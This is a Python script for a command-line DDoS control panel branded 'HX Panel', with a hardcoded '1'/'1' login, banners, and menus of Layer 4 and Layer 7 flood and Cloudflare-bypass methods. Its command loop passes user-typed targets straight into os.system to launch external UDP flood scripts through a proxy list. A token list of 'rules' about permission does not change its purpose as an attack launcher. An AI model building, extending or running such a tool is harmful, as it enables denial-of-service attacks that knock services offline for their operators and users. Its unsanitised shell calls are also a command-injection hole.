import socket
import os
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    WELCOME TO HX PANEL
""")
    time.sleep(0.8)
    clear()


def si():
    print(' \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mDont Fell In Love With Wrong Person! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mTelegram: @TryAwana \x1b[38;2;0;255;255m|!')


def rules():
    clear()
    
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m1. Do not attack without someone's permission \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m3. Do not spam attacks                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgoat-bypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcloudflare-uam    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-dstat          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mautobypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m100up-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-overflow       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-get          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap-vro          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome-god            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-fuck          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtelnet-god          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhaven-god           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')



def menu():
    sys.stdout.write(f"\x1b]2;Hx Net --> Bots: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [4] | Amps: [1]\x07")
    clear()
    print("")
    print(f"""


		\x1b[38;2;0;212;14m.$$\   $$\ $$\   $$\       $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$\       
		\x1b[38;2;0;212;14m.$$ |  $$ |$$ |  $$ |      $$  __$$\ $$  __$$\ $$$\  $$ |$$  _____|$$ |      
		\x1b[38;2;0;212;14m.$$ |  $$ |\$$\ $$  |      $$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ |      $$ |      
		\x1b[38;2;0;212;14m.$$$$$$$$ | \$$$$  /       $$$$$$$  |$$$$$$$$ |$$ $$\$$ |$$$$$\    $$ |      
		\x1b[38;2;0;212;14m.$$  __$$ | $$  $$<        $$  ____/ $$  __$$ |$$ \$$$$ |$$  __|   $$ |      
		\x1b[38;2;0;212;14m.$$ |  $$ |$$  /\$$\       $$ |      $$ |  $$ |$$ |\$$$ |$$ |      $$ |      
		\x1b[38;2;0;212;14m.$$ |  $$ |$$ /  $$ |      $$ |      $$ |  $$ |$$ | \$$ |$$$$$$$$\ $$$$$$$$\ 
		\x1b[38;2;0;212;14m.\__|  \__|\__|  \__|      \__|      \__|  \__|\__|  \__|\________|\________|

    			   | \x1b[38;2;233;233;233mWelcome to HX Panel! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mTelegram: @TryAwana \x1b[38;2;0;255;255m|                                                                     
                                                             

				╔══════════════════════════════════════════════╗
				║           Welcome to Hx Panel DDoS           ║
				║ - - -   The best panel in this year  - - -   ║
				╚══════════════════════════════════════════════╝
		 	  	    ╔══════════════════════════════════════╗
		 	   	    ║  Telegram : @TryAwana PowerProff:    ║
		 	   	    ╚══════════════════════════════════════╝

               			╔══════════════════════════════════════════════╗
                		║   Type [help] to see the sweety commands.    ║
                		╚══════════════════════════════════════════════╝

""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@H\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mpanel\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()

        elif "UDP-Mix" in cnc:
            try:
                host = cnc.split()[1]
                port = cnc.split()[2] 
                method = cnc.split()[3]
                os.system(f'python UDP-Mix.py {host} {port} {method} ')
            except IndexError:
                print('Usage: UDP-Mix <ip> <port> <UDP-Mix>')
                print('Example: UDP-Mix 127.0.0.1 8080 UDP-Mix')

        elif"UDP-BASIC" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2] 
                choice = cnc.split()[3]
                times = cnc.split()[4] 
                threads = cnc.split()[5]

                os.system(f'python flood.py -i {ip} -p {port} -c y -t {times} -th {threads} ')
            except IndexError:
                print('Usage: UDP-BASIC <ip> <port> <times> <threads>')
                print('Example: UDP-BASIC 127.0.0.1 8080 300 10000')

        elif "help" in cnc:
            print(f'''
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩════════════════╗
             ╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  layer7             ║ L║  game               ║ L ║  tools              ║
             ║  layer4             ║  ║  rules              ║   ║  cls                ║
             ║  amp                ║  ║  ports              ║   ║  <empty>            ║
             ╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝

            ''')

def login():
    clear()
    user = "1"
    passwd = "1"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to Stanley CnC!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
